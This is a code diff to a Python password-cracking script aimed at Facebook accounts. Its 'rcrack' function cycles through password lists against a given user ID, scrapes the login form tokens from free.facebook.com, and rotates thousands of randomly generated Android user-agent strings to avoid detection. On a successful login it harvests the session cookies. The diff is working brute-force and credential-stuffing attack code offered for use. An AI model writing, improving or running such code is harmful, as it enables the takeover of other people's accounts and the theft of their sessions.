@@ -143,6 +143,18 @@ def dynamic(text):
 #User agents
 ugen2=[]
 ugen=[]
+
+for ni in range(5000):
+	a='Mozilla/5.0 (Linux; Android '
+	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15'])
+	c='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	d=random.randrange(40,115)
+	e='0'
+	f=random.randrange(3000,6000)
+	g=random.randrange(20,100)
+	h='Mobile Safari/537.36'
+	nihan=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
+	ugen.append(nihan)
  
 for xd in range(10000):
     aa='Mozilla/5.0 (Linux; U; Android'
@@ -219,7 +231,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://free.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -230,9 +242,9 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
+            header_freefb = {'authority': 'free.facebook.com',
+            'method': 'GET',
+            'scheme': 'https', 
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
@@ -249,9 +261,8 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1',
-            'viewport-width': '980',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            'user-agent': pro}
+            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
